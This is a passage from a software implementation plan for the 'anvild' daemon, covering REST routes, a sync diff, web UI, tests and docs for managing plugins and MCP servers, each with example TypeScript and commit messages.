`bootServer` must forward the new option — extend `test/helpers/index.ts` `bootServer(opts)` to accept and pass `pluginService`.

**Step 2: Run, verify failure** (404s).

**Step 3: Implement** — in `http.ts`:

```ts
  // ── Plugin + MCP management (design §5) ────────────────────────────────────────────────────
  const pluginErr = (e: unknown): Response =>
    Response.json({ error: e instanceof Error ? e.message : String(e) }, { status: 500 });

  route("GET", "/api/cc/v1/plugins", async () => {
    try {
      return Response.json({ plugins: await pluginService.list() });
    } catch (e) {
      return pluginErr(e);
    }
  });
  route("GET", "/api/cc/v1/plugins/available", async () => {
    try {
      return Response.json({ plugins: await pluginService.available() });
    } catch (e) {
      return pluginErr(e);
    }
  });
  route("GET", "/api/cc/v1/marketplaces", async () => {
    try {
      return Response.json({ marketplaces: await pluginService.marketplaces() });
    } catch (e) {
      return pluginErr(e);
    }
  });
  route("GET", "/api/cc/v1/mcp", async () => {
    try {
      return Response.json({ servers: await pluginService.mcp() });
    } catch (e) {
      return pluginErr(e);
    }
  });
```

**Step 4: Run, verify pass.**

**Step 5: Commit** — `git commit -m "feat(plugins): REST read routes"`

---

## Task 12: REST write routes

**Files:** Modify `anvild/src/server/http.ts`, `anvild/test/integration/plugin-routes.test.ts`

**Step 1: Write failing test** — append:

```ts
test("POST /api/cc/v1/plugins/install requires JSON content-type", async () => {
  const srv = await bootServer({ pluginService: fakeService() });
  try {
    const res = await fetch(`${srv.base}/api/cc/v1/plugins/install`, { method: "POST", body: "id=a" });
    expect(res.status).toBe(415);
  } finally {
    srv.cleanup();
  }
});

test("POST install returns the CLI's output", async () => {
  const srv = await bootServer({ pluginService: fakeService() });
  try {
    const res = await fetch(`${srv.base}/api/cc/v1/plugins/install`, {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({ id: "a@m" }),
    });
    expect(res.status).toBe(200);
    expect((await res.json()).output).toBe("installed");
  } finally {
    srv.cleanup();
  }
});

test("an unknown op is a 400, not a spawn", async () => {
  const srv = await bootServer({ pluginService: fakeService() });
  try {
    const res = await fetch(`${srv.base}/api/cc/v1/plugins/nope`, {
      method: "POST", headers: { "content-type": "application/json" }, body: "{}",
    });
    expect(res.status).toBe(400);
  } finally {
    srv.cleanup();
  }
});
```

**Step 2: Run, verify failure.**

**Step 3: Implement** — in `http.ts`:

```ts
  const PLUGIN_OPS = new Set(["install", "uninstall", "enable", "disable", "update"]);

  routeRe("POST", /^\/api\/cc\/v1\/plugins\/([a-z]+)$/, async (req, _url, m, ctx) => {
    const op = m![1]!;
    if (!PLUGIN_OPS.has(op)) return new Response(`unknown plugin operation: ${op}`, { status: 400 });
    const ct = (req.headers.get("content-type") || "").toLowerCase();
    if (!ct.includes("application/json")) return new Response("application/json required", { status: 415 });
    // [SEC2-3] parity with /apply: installing a plugin is code execution on this box.
    const who = await ctx.callerIdentity();
    if (who.trust === "otherUser" && !ctx.localNoIdentityCaller) {
      return Response.json({ error: who.reject ?? "different tailnet user" }, { status: 403 });
    }
    const body = (await jsonBody<{ id?: string; scope?: string }>(req)) ?? {};
    if (!body.id) return new Response("id required", { status: 400 });
    try {
      return Response.json({ output: await pluginService.op(op as never, body.id, body.scope) });
    } catch (e) {
      return pluginErr(e);
    }
  });
```

Add the equivalent `POST /api/cc/v1/mcp` (body `{op:"add"|"remove", name, config?}`) and
`POST /api/cc/v1/marketplaces` (body `{op, source}`) following exactly this shape.

**Step 4: Run, verify pass.**

**Step 5: Commit** — `git commit -m "feat(plugins): REST write routes with identity + content-type gates"`

---

## Task 13: Sync diff computation

**Files:** Create `anvild/src/session/plugin-sync.ts`, `anvild/test/unit/plugin-sync.test.ts`

**Step 1: Write failing test**

```ts
import { test, expect } from "bun:test";
import { diffPlugins } from "../../src/session/plugin-sync";
import type { PluginInfo } from "../../src/cc/plugins";

const p = (id: string, version = "1.0.0"): PluginInfo => {
  const [name, marketplace = ""] = id.split("@");
  return { id, name: name!, marketplace, version, enabled: true, scope: "user", mcpServers: [] };
};

test("items on source but not target are installs", () => {
  const d = diffPlugins([p("a@m"), p("b@m")], [p("a@m")]);
  expect(d.install.map((x) => x.id)).toEqual(["b@m"]);
  expect(d.remove).toEqual([]);
});

test("items only on target are removals — and are never pre-selected", () => {
  const d = diffPlugins([p("a@m")], [p("a@m"), p("local@m")]);
  expect(d.remove.map((x) => x.id)).toEqual(["local@m"]);
  expect(d.remove.every((x) => x.selected === false)).toBe(true);
  expect(d.install.every((x) => x.selected === true)).toBe(true);
});

test("a version difference is reported separately from an install", () => {
  const d = diffPlugins([p("a@m", "2.0.0")], [p("a@m", "1.0.0")]);
  expect(d.update).toHaveLength(1);
  expect(d.update[0]).toMatchObject({ id: "a@m", sourceVersion: "2.0.0", targetVersion: "1.0.0" });
  expect(d.install).toEqual([]);
});

test("identical sets produce an empty diff", () => {
  const d = diffPlugins([p("a@m")], [p("a@m")]);
  expect(d.install.length + d.remove.length + d.update.length).toBe(0);
});
```

**Step 2: Run, verify failure.**

**Step 3: Implement** `anvild/src/session/plugin-sync.ts`:

```ts
/**
 * Cross-box plugin sync (design §4.4). Sync NEVER mutates implicitly: this computes a diff, the UI
 * renders it with a checkbox per row, and only ticked rows are applied to the target. Removals are
 * deliberately unselected by default — per-box uniqueness is the point, so a member's local extras
 * must survive a careless click.
 */
import type { PluginInfo } from "../cc/plugins";

export interface DiffRow {
  id: string;
  name: string;
  selected: boolean;
}
export interface UpdateRow extends DiffRow {
  sourceVersion: string;
  targetVersion: string;
}
export interface PluginDiff {
  install: DiffRow[];
  remove: DiffRow[];
  update: UpdateRow[];
}

export function diffPlugins(source: PluginInfo[], target: PluginInfo[]): PluginDiff {
  const byId = (list: PluginInfo[]): Map<string, PluginInfo> => new Map(list.map((p) => [p.id, p]));
  const s = byId(source);
  const t = byId(target);
  const diff: PluginDiff = { install: [], remove: [], update: [] };

  for (const [id, sp] of s) {
    const tp = t.get(id);
    if (!tp) diff.install.push({ id, name: sp.name, selected: true });
    else if (tp.version !== sp.version) {
      diff.update.push({ id, name: sp.name, selected: true, sourceVersion: sp.version, targetVersion: tp.version });
    }
  }
  for (const [id, tp] of t) {
    if (!s.has(id)) diff.remove.push({ id, name: tp.name, selected: false });
  }
  return diff;
}
```

**Step 4: Run, verify pass.** Expected: PASS (4 tests).

**Step 5: Commit** — `git commit -m "feat(plugins): cross-box sync diff"`

---

## Task 14: Web — `plugins.ts` seam + Settings tab shell

**Files:** Create `anvild/web/src/plugins.ts`; modify `anvild/web/src/settings.ts` (tab list ~line 128, panel section ~line 136), `anvild/web/src/main.ts` (init call).

**Step 1: Add the tab button** — in `settings.ts`, after the Prompts tab:

```html
      <button class="stab" role="tab" data-tab="plugins">${icon("extension")} Plugins</button>
```

Add `"plugins"` to the `SettingsTab` union (~line 118).

**Step 2: Add the panel section** — after the prompts `<section>`:

```html
      <section class="settings-panel" data-tab="plugins">
        <div class="section-head"><h3>Plugins &amp; MCP</h3><button id="plugins-sync" class="mini">${icon("sync")} Sync…</button></div>
        <p class="small muted">Plugins and MCP servers are installed per machine. Changes apply to each session's next turn.</p>
        <div id="plugin-cards"><p class="small muted">Loading…</p></div>
      </section>
```

**Step 3: Create the seam** `anvild/web/web/src/plugins.ts` → `anvild/web/src/plugins.ts`:

```ts
// ── Plugins & MCP: per-server management over the daemon's /api/cc/v1 surface ──────────────────
// One section per connected server (plugins are per machine). Gated on the "plugins" capability so
// an older daemon renders nothing rather than dead controls — the ccCardRowHtml pattern.
import { busy, esc, icon, repaintPreservingInput } from "./dom";
import { confirmDialog, toast } from "./dialogs";
import { orderedServers, serverFetch, serverSupports, cssId, type Server } from "./fleet";

interface PluginRow { id: string; name: string; marketplace: string; version: string; enabled: boolean; scope: string }
interface McpRow { name: string; target?: string; connected: boolean; raw?: boolean }

export async function renderPluginCards(): Promise<void> {
  const host = document.getElementById("plugin-cards");
  if (!host) return;
  const targets = orderedServers().filter((s) => serverSupports(s, "plugins"));
  if (!targets.length) {
    host.innerHTML = `<p class="small muted">No connected server supports plugin management yet.</p>`;
    return;
  }
  host.innerHTML = targets.map((srv) => `<div class="card" id="plug-${cssId(srv.url)}"><p class="small muted">Loading ${esc(srv.name)}…</p></div>`).join("");
  await Promise.all(targets.map((srv) => loadServer(srv)));
}

async function loadServer(srv: Server): Promise<void> {
  const card = document.getElementById(`plug-${cssId(srv.url)}`);
  if (!card) return;
  try {
    const [pl, mcp] = await Promise.all([
      (await serverFetch(srv.url, "/api/cc/v1/plugins")).json() as Promise<{ plugins: PluginRow[] }>,
      (await serverFetch(srv.url, "/api/cc/v1/mcp")).json() as Promise<{ servers: McpRow[] }>,
    ]);
    card.innerHTML = cardHtml(srv, pl.plugins ?? [], mcp.servers ?? []);
    wireCard(srv, card);
  } catch (e) {
    card.innerHTML = `<b>${esc(srv.name)}</b><p class="small muted">Couldn't load plugins: ${esc(e instanceof Error ? e.message : String(e))}</p>`;
  }
}
```

(Continue with `cardHtml` and `wireCard` in Tasks 15–17.)

**Step 4: Call it** — in `settings.ts`'s `selectSettingsTab`, when the tab is `plugins`, call `void renderPluginCards()`.

**Step 5: Verify**

Run: `bun run typecheck:web && bun run build:web`
Expected: clean.

**Step 6: Commit** — `git commit -m "feat(web): Plugins settings tab shell"`

---

## Task 15: Web — render plugin + MCP rows

**Files:** Modify `anvild/web/src/plugins.ts`

Implement `cardHtml(srv, plugins, mcp)` returning:

- a header line: server name + host;
- one row per plugin: `name@marketplace`, version, `scope` chip, an on/off state, and buttons
  `Disable`/`Enable`, `Update`, `Uninstall` (each `data-id` carrying the plugin id);
- an `Install from marketplace` button (`data-srv`);
- an MCP block listing `name — target` with `✔ connected` / `⚠ needs attention`, a `Remove` button
  per row, and an `Add server` button. A row with `raw: true` renders its text verbatim in a
  `<code>` with a "couldn't parse" note.

Escape every interpolated value with `esc()`. **Never** render secret values — names, targets and
status only (design §8).

**Verify:** `bun run typecheck:web && bun run build:web`
**Commit:** `git commit -m "feat(web): render plugin and MCP rows per server"`

---

## Task 16: Web — plugin actions

**Files:** Modify `anvild/web/src/plugins.ts`

Implement `wireCard`:

```ts
function wireCard(srv: Server, card: HTMLElement): void {
  card.querySelectorAll<HTMLButtonElement>("[data-op]").forEach((btn) => {
    btn.addEventListener("click", async () => {
      const op = btn.dataset.op!;
      const id = btn.dataset.id!;
      if ((op === "uninstall" || op === "disable") && !(await confirmDialog(`${op === "uninstall" ? "Uninstall" : "Disable"} ${id}?`, { danger: true }))) return;
      await busy(btn, `${op}…`, async () => {
        const res = await serverFetch(srv.url, `/api/cc/v1/plugins/${op}`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ id }),
        });
        if (!res.ok) {
          toast(`${op} failed: ${await res.text()}`);
          return;
        }
        toast(`${id} ${op}d — applies to the next turn`);
        await loadServer(srv);
      });
    });
  });
}
```

Every async button goes through `busy()`; every destructive one through `confirmDialog`.

**Verify:** `bun run typecheck:web && bun run build:web`
**Commit:** `git commit -m "feat(web): plugin install/enable/disable/update/uninstall actions"`

---

## Task 17: Web — MCP add/remove

**Files:** Modify `anvild/web/src/plugins.ts`, `anvild/web/src/dialogs.ts`

Add a `showAddMcpServer(srv)` modal via `modalPromise`/`showModal` collecting: name, transport
(`stdio` | `http` | `sse`), command+args or URL, and optional headers/env as key=value lines. Submit
posts `{op:"add", name, config}` to `/api/cc/v1/mcp`.

Because this modal holds secrets, it must repaint through `repaintPreservingInput` if it is ever
re-rendered, and its values must never be logged or echoed into a toast.

**Verify:** `bun run typecheck:web && bun run build:web`
**Commit:** `git commit -m "feat(web): add and remove MCP servers"`

---

## Task 18: Sync REST endpoint

**Files:** Modify `anvild/src/server/http.ts`; extend `anvild/test/integration/plugin-routes.test.ts`

`POST /api/cc/v1/plugins/sync/plan` with `{sourceUrl}` → the hub fetches the source server's plugin
list, compares against its own via `diffPlugins`, returns the diff.
`POST /api/cc/v1/plugins/sync/apply` with `{install:[], remove:[], update:[]}` → executes ONLY the
listed ids through `pluginService.op`, returning a per-item `{id, ok, error?}` array. **Never**
report overall success when any item failed (design §7).

Test: an apply where one item throws returns `ok:false` for that item and `ok:true` for the others,
and the response is still 200 with per-item detail.

**Commit:** `git commit -m "feat(plugins): sync plan/apply endpoints with per-item results"`

---

## Task 19: Web — sync diff UI

**Files:** Modify `anvild/web/src/plugins.ts`

`#plugins-sync` opens a modal: pick source and target from connected servers, POST `sync/plan`,
render three groups (Install / Update / Remove) with a checkbox per row — installs and updates
pre-ticked, **removals unticked** — then POST `sync/apply` with the ticked ids and render per-item
results inline (✔ / ⚠ + message), leaving the modal open so failures stay readable.

**Verify:** `bun run typecheck:web && bun run build:web`
**Commit:** `git commit -m "feat(web): per-item sync diff UI"`

---

## Task 20: Web DOM tests

**Files:** Create `anvild/test/web/plugins-panel.test.ts`

Using `installDom` + a URL-routing `fetch` stub (copy `test/web/cc-update-card.test.ts`):

- no server advertising `plugins` → the panel renders the "no connected server" message and **no
  buttons**;
- a server with two plugins renders two rows with correct ids;
- clicking Uninstall calls `confirmDialog` and POSTs to `/api/cc/v1/plugins/uninstall`;
- a failing POST surfaces a toast and does **not** claim success.

**Run:** `bun test test/web/plugins-panel.test.ts` → PASS
**Commit:** `git commit -m "test(web): plugins panel DOM coverage"`

---

## Task 21: Docs

**Files:** Modify `docs/ARCHITECTURE.md`, `SECURITY.md`

- ARCHITECTURE: a short "Plugin & MCP management" section — adapter → service → REST → per-server
  UI, and the "applies to the next turn" property that falls out of spawn-per-turn.
- SECURITY: state plainly that installing a plugin is code execution on the daemon's box, gated by
  the Tailscale boundary + origin gate + the `otherUser` identity check, and that synced MCP configs
  carry their secrets by design (design §4.4).

**Commit:** `git commit -m "docs: plugin & MCP management architecture and security notes"`

---

## Task 22: Live pass

Not automatable — record the outcome in the status table.

1. `anvild/scripts/service.sh restart` on the canonical checkout.
2. Settings → Plugins: confirm the hub's real plugin list renders and matches `claude plugin list`.
3. Install a small plugin from a marketplace; confirm it appears, then open a session, send one
   prompt, and confirm its command appears in the composer's `/` menu (the next-turn property).
4. Disable it, uninstall it, confirm the list returns to its original state.
5. Add and remove a throwaway MCP server; confirm `claude mcp list` agrees.
6. With a second machine paired: run Sync, tick one install, apply, confirm it lands there only.
7. Full gates: `bun run typecheck && bun run typecheck:web && bun run build:web && bun test`.

**Commit:** `git commit -m "docs(plans): plugin & MCP management live pass recorded"`

---

## Notes for the executor

- **The `-y` flag is not optional.** `claude plugin install` requires it whenever stdin/stdout is
  not a TTY, which is always true for the daemon. Omitting it makes installs hang.
- **Do not add a generic "run any claude subcommand" endpoint.** The closed operation set is the
  security boundary (design §4.2/§8).
- **`claude mcp list` has no `--json`.** If a future CLI adds one, delete the tolerant parser and its
  test rather than keeping both.
- Prefer `init.mcp_servers` / `init.plugins` (already parsed every turn in `cc/turn-runner.ts`) for
  *status display* if you find the REST reads too slow — the design allows it and it costs no spawn.
